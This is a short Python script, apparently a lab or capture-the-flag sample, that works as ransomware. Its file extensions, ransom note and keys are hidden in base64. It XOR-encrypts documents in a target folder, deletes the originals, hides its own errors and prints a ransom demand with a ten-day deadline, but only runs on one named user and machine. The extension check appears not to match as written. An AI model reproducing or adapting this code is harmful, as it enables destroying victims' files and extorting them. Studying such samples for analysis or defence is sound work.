import base64
from pwn import xor
import os

Var1 = "Ki50eHQgKi5kb2MgKi5kb2N4ICoucGRm"
Var2 = "LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpZT1VSIEZJTEVTIEhBVkUgQkVFTiBFTkNSWVBURUQgQlkgQSBSQU5TT01XQVJFCiogV2hhdCBoYXBwZW5lZD8KTW9zdCBvZiB5b3VyIGZpbGVzIGFyZSBubyBsb25nZXIgYWNjZXNzaWJsZSBiZWNhdXNlIHRoZXkgaGF2ZSBiZWVuIGVuY3J5cHRlZC4gRG8gbm90IHdhc3RlIHlvdXIgdGltZSB0cnlpbmcgdG8gZmluZCBhIHdheSB0byBkZWNyeXB0IHRoZW07IGl0IGlzIGltcG9zc2libGUgd2l0aG91dCBvdXIgaGVscC4KKiBIb3cgdG8gcmVjb3ZlciBteSBmaWxlcz8KUmVjb3ZlcmluZyB5b3VyIGZpbGVzIGlzIDEwMCUgZ3VhcmFudGVlZCBpZiB5b3UgZm9sbG93IG91ciBpbnN0cnVjdGlvbnMuCiogSXMgdGhlcmUgYSBkZWFkbGluZT8KT2YgY291cnNlLCB0aGVyZSBpcy4gWW91IGhhdmUgdGVuIGRheXMgbGVmdC4gRG8gbm90IG1pc3MgdGhpcyBkZWFkbGluZS4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQo="
Var3 = "NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg=="
Var4 = "n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ"

def Base64DecodeVar2():
    return base64.b64decode(Var2).decode()

def Decode_And_Split_Var1():
    return base64.b64decode(Var1).decode().split(' ')

def Base64DecodeString(input_string):
    return base64.b64decode(input_string)

def XOR_TripleBuffer(inputBytes,key1,key2):
    return xor(inputBytes,key1,key2)

def encode_xor_base64(input_bytes, key1_str, key2_str):
    if not input_bytes:
        return None
    key1_bytes = key1_str.encode('utf-8')
    key2_bytes = key2_str.encode('utf-8')
    xor_result = XOR_TripleBuffer(input_bytes, key1_bytes, key2_bytes)
    return base64.b64encode(xor_result).decode('utf-8')

decoded_key1 = Base64DecodeString(Var3)
decoded_key2 = Base64DecodeString(Var4)


def encrypt_files(run=False,key1=None, key2=None, target_dir="dca01aq2/"):
    try:
        if run:
            extensions = Decode_And_Split_Var1()
            if os.path.exists(target_dir):
                for root, dirs, files in os.walk(target_dir):
                    for file in files:
                        for ext in extensions:
                            if file.endswith(f".{ext}"):
                                file_path = os.path.join(root, file)
                                with open(file_path, "rb") as f:
                                    file_bytes = f.read()
                                encoded = encode_xor_base64(file_bytes, key1, key2)
                                with open(file_path + ".secured", "w", encoding="utf-8") as f:
                                    f.write(encoded)
                                os.remove(file_path)
                                break
    except Exception:
        pass


if os.getenv("USERNAME") == "developer56546756" and os.getenv("COMPUTERNAME") == "Workstation5678":
    encrypt_files(
        run=True,
        key1=decoded_key1,
        key2=decoded_key2,
        target_dir="dca01aq2/"
    )

    # Print ransom message
    ransom_note = Base64DecodeVar2()
    print(ransom_note)
